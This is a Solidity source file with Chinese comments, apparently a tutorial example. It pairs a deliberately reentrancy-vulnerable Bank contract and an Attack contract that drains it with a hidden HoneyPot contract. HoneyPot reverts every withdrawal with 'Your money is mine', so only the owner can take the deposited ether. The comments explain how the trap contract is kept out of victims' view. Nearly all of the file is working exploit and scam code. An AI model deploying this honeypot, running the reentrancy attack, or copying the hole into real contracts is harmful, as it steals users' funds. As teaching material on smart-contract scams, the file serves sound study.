
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Bank {
    //受益人地址
    address public owner;
    //记录用户存款余额
    mapping(address => uint) public balances;
    //日志器合约（实际上是蜜罐合约）
    Logger logger;

    constructor(Logger _logger) {
        //获取蜜罐合约
        logger = Logger(_logger);
        //将owner赋值为部署合约地址
        owner = msg.sender;
    }

    function deposit() public payable {
        //记录余额变化
        balances[msg.sender] += msg.value;
        //调用蜜罐合约的log方法，此处不会revert交易，用户正常存款
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint _amount) public {
        //检验退款金额是否<=余额
        require(_amount <= balances[msg.sender], "Insufficient funds");
        //给msg.sender退款，此处可以被重入攻击
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
        //记录余额变化
        balances[msg.sender] -= _amount;
        //调用蜜罐合约的log方法，此处会revert交易，强制交易回滚，用户无法退款
        logger.log(msg.sender, _amount, "Withdraw");
    }
    //受益人可用此函数取走合约内所有余额
    function ownerWithdraw() public {
        //检验msg.sender是否为受益者地址
        require(owner == msg.sender, "Not owner");
        //如果是就转移全部余额
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
//日志器合约，不会被部署
contract Logger {
    event Log(address caller, uint amount, string action);
    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        emit Log(_caller, _amount, _action);
    }
}

contract Attack {
    Bank public bank;

    constructor(Bank _bank) {
        //获取要攻击的银行合约
        bank = Bank(_bank);
    }

    fallback() external payable {
        //进行重入攻击
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }
    receive() external payable{}
    //存款攻击和退款攻击要分别在两个函数内写，否则交易会直接回滚到存款之前的状态
    function attackDeposit() public payable {
        bank.deposit{value: 1 ether}();
    }
    function attackWithdraw() public payable {
        bank.withdraw(1 ether);
    }
}
//这段合约代码位于一个单独的文件中，使得其他人无法读取它
contract HoneyPot {
    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public pure {
        //如果用户执行退款操作，强制回滚
        if (equal(_action, "Withdraw")) {
            revert("Your money is mine");
        }
    }

    // 用keccak256比较字符串
    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}